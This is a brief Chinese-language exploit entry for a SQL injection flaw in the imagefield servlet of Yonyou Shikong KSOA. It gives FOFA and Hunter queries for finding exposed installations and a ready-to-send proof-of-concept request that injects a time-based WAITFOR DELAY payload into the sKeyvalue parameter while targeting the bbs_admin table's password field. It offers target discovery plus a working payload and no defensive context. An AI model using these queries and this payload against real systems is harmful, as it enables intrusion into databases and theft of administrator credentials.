# 用友时空KSOA imagefield SQL注入

## 网络测绘

fofa: app="用友-时空KSOA"

hunter: app.name="用友时空 KSOA"

## POC / EXP

```
/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:10%27--
```